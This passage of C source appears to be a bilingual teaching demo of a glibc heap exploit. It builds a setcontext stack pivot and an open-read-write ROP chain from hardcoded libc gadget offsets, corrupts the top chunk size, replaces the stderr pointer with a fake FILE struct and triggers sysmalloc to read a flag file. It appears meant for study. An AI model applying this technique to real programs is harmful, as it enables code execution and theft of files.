        printf("\033[32m[rdi+0x8]现在的值为: \033[31m%#zx\033[32m.\n\033[0m", space[1]);

        puts("\033[32mThen we need to write address of setcontext into [rdx+0x20].\033[0m");
        puts("\033[32m然后我们需要写setcontext函数的地址到[rdx+0x20]。\033[0m");
        puts("\033[32mHave a look at disassembly result of function setcontext: \033[0m");
        puts("\033[32m看一下setcontext函数的汇编: \033[0m");
        puts("\033[34m.text:0000000000053A6D                 \033[1;31mmov     rsp, [rdx+0A0h]\033[34m\n"
             ".text:0000000000053A74                 mov     rbx, [rdx+80h]\n"
             ".text:0000000000053A7B                 mov     rbp, [rdx+78h]\n"
             ".text:0000000000053A7F                 mov     r12, [rdx+48h]\n"
             ".text:0000000000053A83                 mov     r13, [rdx+50h]\n"
             ".text:0000000000053A87                 mov     r14, [rdx+58h]\n"
             ".text:0000000000053A8B                 mov     r15, [rdx+60h]\n"
             ".text:0000000000053A8F                 test    dword ptr fs:48h, 2\n"
             ".text:0000000000053A9B                 jz      loc_53B56\n"
             "\t\t\t......\n"
             ".text:0000000000053B56                 \033[1;31mmov     rcx, [rdx+0A8h]\033[34m\n"
             ".text:0000000000053B5D                 \033[1;31mpush    rcx\033[34m\n"
             ".text:0000000000053B5E                 mov     rsi, [rdx+70h]\n"
             ".text:0000000000053B62                 mov     rdi, [rdx+68h]\n"
             ".text:0000000000053B66                 mov     rcx, [rdx+98h]\n"
             ".text:0000000000053B6D                 mov     r8, [rdx+28h]\n"
             ".text:0000000000053B71                 mov     r9, [rdx+30h]\n"
             ".text:0000000000053B75                 mov     rdx, [rdx+88h]\n"
             ".text:0000000000053B75 ; } // starts at 53A30\n"
             ".text:0000000000053B7C ; __unwind {\n"
             ".text:0000000000053B7C                 xor     eax, eax\n"
             ".text:0000000000053B7E                 retn\033[0m");

        puts("\033[32mWe let [rdx+0xa0] = bss + 0x100, and let [rdx+0xa8] = some gadget address as the start of our ROP chain.\033[0m");
        puts("\033[32m我们让[rdx+0xa0] = bss + 0x100, 让[rdx+0xa8] = 某些gadget的地址作为ROP链的开始。\033[0m");
        puts("\033[32mThere are some useful gadgets: \033[0m");
        puts("\033[32m这里是一些有用的gadget地址: \033[0m");
        size_t poprdi_ret = libc_base + 0x2a3e5;
        size_t poprsi_ret = libc_base + 0x2be51;
        size_t poprdx_rbx_ret = libc_base + 0x90529;
        printf("\033[33mpop rdi ; ret : %#zx\n\033[0m", poprdi_ret);
        printf("\033[33mpop rsi ; ret : %#zx\n\033[0m", poprsi_ret);
        printf("\033[33mpop rdx ; pop rbx ; ret : %#zx\n\033[0m", poprdx_rbx_ret);
        puts("\033[32mHere are some key functions: \033[0m");
        puts("\033[32m这里是一些关键函数的地址: \033[0m");
        size_t readfunc_addr = (size_t)read;
        size_t writefunc_addr = (size_t)write;
        size_t openfunc_addr = (size_t)open;
        printf("\033[33mopen(): %#zx\n\033[0m", openfunc_addr);
        printf("\033[33mread(): %#zx\n\033[0m", readfunc_addr);
        printf("\033[33mwrite(): %#zx\n\033[0m", writefunc_addr);

        space[0x20 / 8] = (size_t)(libc_base + 0x53a6d);
        space[0xa0 / 8] = (size_t)(&space[0x100 / 8]);
        space[0xa8 / 8] = poprdi_ret;

        puts("\033[32mThen let's construct our ROP chain.\033[0m");
        puts("\033[32m然后我们来构造ROP链。\033[0m");
        space[0x100 / 8] = (size_t)flag;
        space[0x108 / 8] = poprsi_ret;
        space[0x110 / 8] = 0;
        space[0x118 / 8] = openfunc_addr;
        space[0x120 / 8] = poprdi_ret;
        space[0x128 / 8] = 3;
        space[0x130 / 8] = poprsi_ret;
        space[0x138 / 8] = (size_t)(&space[0xf0]);
        space[0x140 / 8] = poprdx_rbx_ret;
        space[0x148 / 8] = 0x40;
        space[0x150 / 8] = 0;
        space[0x158 / 8] = readfunc_addr;
        space[0x160 / 8] = poprdi_ret;
        space[0x168 / 8] = 1;
        space[0x170 / 8] = poprsi_ret;
        space[0x178 / 8] = (size_t)(&space[0xf0]);
        space[0x180 / 8] = poprdx_rbx_ret;
        space[0x188 / 8] = 0x40;
        space[0x190 / 8] = 0;
        space[0x198 / 8] = writefunc_addr;

        puts("\033[32mHere is the former part of bss spare space:\033[0m");
        puts("\033[32m下面是bss空闲区域前面的一部分:\033[0m");
        for(int i=0; i<0x20; i++)
            printf("\033[1;34m+%#5x\t\t%#18zx\t\t%#18zx\n\033[0m", i * 0x10, space[2*i], space[2*i+1]);

    }else{
        puts("\033[31mError: invalid exploit mode!\033[0m");
        puts("\033[31m错误：选择了无效的利用模式！\033[0m");
        exit(1);
    }

    puts("\033[032mThen, we need to \033[31mchange the size of top chunk to make it unaligned, and malloc a big space.\033[0m");
    puts("\033[032m然后，我们需要\033[31m修改top chunk的大小来让它不对齐，然后malloc一块大空间。\033[0m");
    *top_chunk_size = 0x101;
    printf("\033[32mThe value of top_chunk->size was changed into: %#zx\033[0m\n", *top_chunk_size);
    printf("\033[32m现在top_chunk->size的值被修改为: %#zx\033[0m\n", *top_chunk_size);

    puts("\033[32mThen, change the value of stderr pointer.\033[0m");
    puts("\033[32m然后，修改stderr指针的值。\033[0m");
    printf("\033[32mBefore alteration: *stderr_pointer = \033[33m%p\n\033[0m", *((struct _IO_FILE**)(stderr_ptr)));
    printf("\033[32m修改之前: *stderr_pointer = \033[33m%p\n\033[0m", *((struct _IO_FILE**)(stderr_ptr)));
    *(size_t*)stderr_ptr = (size_t)fake_file_struct;
    printf("\033[32mAfter alteration: *stderr_pointer = \033[31m%p\n\033[0m", *((struct _IO_FILE**)(stderr_ptr)));
    printf("\033[32m修改之后: *stderr_pointer = \033[31m%p\n\033[0m", *((struct _IO_FILE**)(stderr_ptr)));

    printf("\033[32mAnd the last step: malloc(0x200) to trigger sysmalloc.\n\033[0m");
    printf("\033[32m然后是最后一步：malloc(0x200)触发sysmalloc。\n\033[0m");
    malloc(0x200);
}
```
